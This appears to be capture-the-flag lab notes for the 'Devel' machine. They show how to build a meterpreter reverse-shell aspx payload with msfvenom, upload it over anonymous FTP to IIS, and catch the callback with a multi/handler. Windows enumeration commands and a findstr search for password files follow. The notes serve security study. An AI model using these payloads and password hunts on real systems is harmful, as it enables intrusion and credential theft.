## Gaining a Foothold

### Devel (Using MSF conditions)  

**Initial Enum / RevShell Payload:**  
Nmap scan > iis server and ftp anonymous login identified > login ftp server and `PUT` test file sucessful > use msfvenom to generate a reverse tcp shell in aspx (since target is hosting iis)

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.05 LPORT=4444 -f aspx -o reverse.aspx`  

![image](https://github.com/user-attachments/assets/3db1aa08-39b4-45d2-afbe-01710f16b7cd)

**Listener with msfconsole multi handler:**  
msfconsole > use exploit/multi/handler > options > set payload windows/meterpreter/reverse_tcp > set LHOST ATTACKERIP > set LPORT 4444 > run

**Upload payload to iis:**  
ftp anonyomous login > `PUT reverse.aspx` > load http://victim/reverse.aspx (to trigger meterpreter reverse shell connection)  

#### System Enumeration  
now that we are a low level user, we repeat the cycle of information gathering, scanning enumeration and further exploitation.  

meterpreter: shell  
`systeminfo`  
`hostname`  
patching checks (windows management instrumentation command line + quick fix engineering) : `wmic qfe` or `wmic qfe get Caption,Description,HotFixID,InstalledOn` for a cleaner view  
driver enumeration: `wmic logicaldisk get caption,description,providername`

#### User Enumeration  
check hostname and user logged in`whoami`  
check current priviliges `whoami /priv`  
groups you belong to `whoami /groups`
users on the host `net user`  
enum found users `net user exampleuser`  
list all local group memberships `net localgroup`  
list all users in the administrator group `net localgroup administrators`  

#### Network Enumeration  
`ipconfig`  
`ipconfig /all`  
`arp -a`  
(check where else the host is connecting to) `route print`  
(where is the host connecting to and what ports are open, if new connections / ports are found only internally and not frem an external scan it could provide ideas such as the potential port forward,) `netstat -ano`  

#### Password Hunting  
(finds string of 'password' in the listed file types WITHIN the current directory) `findstr /si password *.txt *.ini *.config *.xml`  

### Automated Tools
